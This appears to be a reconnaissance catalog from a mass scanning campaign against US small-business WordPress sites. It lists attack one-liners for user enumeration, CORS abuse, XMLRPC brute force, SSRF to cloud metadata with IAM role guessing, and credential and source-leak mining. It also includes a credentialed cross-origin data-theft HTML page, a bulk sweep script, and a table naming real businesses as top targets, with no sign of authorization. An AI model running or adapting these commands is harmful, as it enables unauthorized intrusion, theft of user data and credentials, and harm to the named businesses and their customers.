# Wave 9 Pattern Catalog — Condensed Reference for SMB Recon

**Full document:** `/root/output/recon_us/techniques/wave9_techniques.md`
**Architecture:** `/root/output/recon_us/techniques/WAVE9_TECHNIQUE_ARCHITECTURE.md`
**Data source:** 600+ unique domains, 28+ sectors, 18 technique documents, 331 findings files across Wave1-8

---

## 25 Recurring Attack Patterns

| # | Name | Quick PoC | Hit Rate |
|---|------|-----------|----------|
| P-01 | WP REST User Enum | `curl -sk T/wp-json/wp/v2/users` | ~9% of all US sites |
| P-02 | CORS Origin Reflection | `curl -skI T/wp-json/wp/v2/users -H "Origin: https://evil.com" \| grep -iE "access-control"` | ~7-8% of WP sites |
| P-03 | CORS Null Origin | Same as P-02 but `Origin: null` | ~1 in 20 CORS vulns |
| P-04 | CORS Wildcard (*) | `curl -skI T/ \| grep "access-control-allow-origin: \*"` | ~3% of all sites |
| P-05 | CORS Credentialed OPTIONS | `curl -sk -X OPTIONS T/wp-json/wp/v2/users -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET"` | Under-tested |
| P-06 | CORS on 401 Endpoints | Test on auth-protected endpoints (gf/v2/forms, wc/v3) — CORS still reflects | 100% of CORS sites |
| P-07 | XMLRPC Multicall BF | POST to xmlrpc.php with system.multicall | ~52% of WP sites |
| P-08 | XMLRPC Pingback SSRF | POST to xmlrpc.php with pingback.ping → 169.254.169.254 | ~15% of XMLRPC sites |
| P-09 | IMDS Role Guessing | Loop role names (admin, ec2, s3, lambda) via pingback | Always when SSRF works |
| P-10 | Open Reg + wp.uploadFile → RCE | Check /wp-login.php?action=register + info.php for exec() | Rare (requires 3 conditions) |
| P-11 | Plugin Namespace BF | Loop 30 REST namespaces, non-404 = plugin exists | Standard WP deep dive |
| P-12 | Yoast Author Sitemap Enum | `curl -sk T/author-sitemap.xml \| grep -oP '<loc>[^<]+</loc>'` | Common on Yoast sites |
| P-13 | Staging = Weaker Security | Probe staging.*, dev.* subdomains | High when staging exists |
| P-14 | Staging WP Install Pages | `curl -sk staging.T/wp-admin/install.php` | 100% of staging sites |
| P-15 | Error Log Credential Mining | `curl -sk T/error_log \| grep -oiP '(SELECT\|INSERT).{0,200}'` | ~1% but huge impact |
| P-16 | phpinfo → Exec Check | `curl -sk T/info.php \| grep "disable_functions"` | ~10% of WP sites |
| P-17 | Source Leak Mass Scan | Loop 20+ paths: .env, .git/config, debug.log, backup.sql | ~7% with 3+ leaks |
| P-18 | JS Bundle Secrets | Download all .js, grep for AIza*, sk_live*, apiKey | Low yield, high impact |
| P-19 | MySQL 3306 Public | `nmap -sV -p 3306 T` | ~1 in 600 |
| P-20 | Internal Ports (8082+) | Loop 8080-9090, check for admin panels | Rare |
| P-21 | WooCommerce API Detect | Loop wc/v3, wc/v2, wc/v1, wc/store/v1, wc/pos/v1 | ~42% of WP deep targets |
| P-22 | Elementor 500 Info Leak | `/wp-json/elementor/v1/favorites` → HTTP 500 | Common on Elementor sites |
| P-23 | Hosting Cluster vulns | Fingerprint hosting provider → predict vuln profile | Dominant pattern |
| P-24 | IAM Role Enum via SSRF | 15+ common role names via pingback | Always when SSRF works |
| P-25 | CORS on ALL WP endpoints | Once confirmed, test all WP REST endpoints (not just users) | 100% of CORS sites |

---

## 8 CORS Bypass Variations

| V# | Variation | ACAO | ACAC | Attack |
|----|-----------|------|------|--------|
| V1 | Origin Reflection | Reflected | true | Full credentialed read |
| V2 | Null Origin | `null` | true | Sandboxed iframe / data: URI |
| V3 | Wildcard | `*` | false | Read-only, no cookies |
| V4 | Credentialed Preflight | On OPTIONS | true | Preflight bypass |
| V5 | Auth-Endpoint Leak | Reflected | true | Even 401/403 endpoints leak |
| V6 | Multi-Origin | Multiple | true | Any origin works |
| V7 | Plugin-Specific | Reflected | true | Plugin-specific endpoints |
| V8 | Staging-Only | Reflected | true | Staging only (prod may be secure) |

---

## Drop-In PoC HTML (Browser Data Exfil)

```html
<!doctype html><body><pre id="out"></pre><script>
(async()=>{const T="https://TARGET";let o=[];
try{let r=await fetch(T+"/wp-json/wp/v2/users",{credentials:"include"});
let d=await r.json();o.push("USERS: "+d.map(u=>u.name).join(", "))}catch(e){}
try{let r=await fetch(T+"/wp-json/wp/v2/posts",{credentials:"include"});
let d=await r.json();o.push("POSTS: "+d.length)}catch(e){}
try{let r=await fetch(T+"/wp-json/wp/v2/media",{credentials:"include"});
let d=await r.json();o.push("MEDIA: "+d.length)}catch(e){}
document.getElementById("out").innerText=o.join("\n---\n")})();
</script></body>
```

---

## Sector Hit Rates (Best → Worst)

| Rank | Sector | Vuln Rate | Top Target | Best Attack |
|------|--------|-----------|------------|-------------|
| 1 | Locksmiths | 66% | locksmiths.net | WP Users + CORS |
| 2 | HVAC | 33% | completeheatandair.com | CORS + XMLRPC |
| 3 | Property Mgmt | 15% | williambrown.com | CORS + User Enum |
| 4 | Photography | 10% | zenfolio.com | CORS Reflection |
| 5 | Dental | 15% | familydental.com | Null Origin CORS |
| 6 | Church | 25% | hillsong.com | CORS + REST |
| 7 | Pest Control | 20% | vikingpest.com | CORS Reflection |
| 8 | Gyms | 15% | defy.com | CORS + Franchise Portal |
| 9 | Window Cleaning | 25% | windowmedics.com | CORS + XMLRPC |
| 10 | Septic | 25% | septictank.com | Source Leaks + CORS |
| 11 | Car Washes | 20% src leaks | gocarwash.com | Source Leaks |
| 12 | Bakeries | 18% | nothingbundtcakes.com | 28 Source Leaks |

---

## Highest-Yield Command Sequence (Best findings-per-minute)

```bash
# Phase 1 — Quick filter (2 min / 50 targets)
cat targets.txt | httpx -silent -threads 50 -tech-detect -status-code | grep "WordPress" | awk '{print $1}' > wp_targets.txt

# Phase 2 — CORS + User Enum + XMLRPC sweep (1 min)
while read t; do
  u=$(curl -sk -m5 "https://$t/wp-json/wp/v2/users" 2>/dev/null)
  [ -n "$u" ] && user_count=$(echo "$u" | python3 -c "import sys,json;print(len(json.load(sys.stdin)))" 2>/dev/null) && echo "[USERS:$user_count] $t"
  c=$(curl -skI -m5 "https://$t/wp-json/wp/v2/users" -H "Origin: https://evil.com" 2>/dev/null | grep -c "evil.com")
  [ "$c" -gt 0 ] && echo "[CORS] $t"
  x=$(curl -sk -m5 -o /dev/null -w "%{http_code}" "https://$t/xmlrpc.php" 2>/dev/null)
  [ "$x" = "200" ] && echo "[XMLRPC] $t"
done < wp_targets.txt

# Phase 3 — Source leak sweep (10 sec / target, parallel)
while read t; do
  for path in /.env /.git/config /wp-config.php.bak /debug.log /backup.sql /info.php /phpinfo.php; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$t$path" 2>/dev/null)
    [ "$code" = "200" ] && echo "[LEAK] $t$path"
  done
done < wp_targets.txt
```

---

## Failed Patterns (Avoid These)

| Technique | Why | Alternative |
|-----------|-----|-------------|
| Default creds | WP auto-generates passwords since v5.0 | Multicall BF |
| .git/HEAD on SPA sites | Returns HTML, not git refs | Check content, not just 200 |
| CORS on non-WP sites | Always SECURE | Skip unless WP detected |
| SliderRev v1 REST | 6.x renamed endpoints (all 404) | Need new path discovery |
| Google API key exploit | Most are restricted | Verify restriction first |
| Gravity Forms unauth | v2.8+ requires auth | Need session + CORS |
| IMDS data via pingback | faultCode 0, no body returned | OOB SSRF callback needed |
| WP install on production | Only observed on staging | Focus staging/dev subdomains |
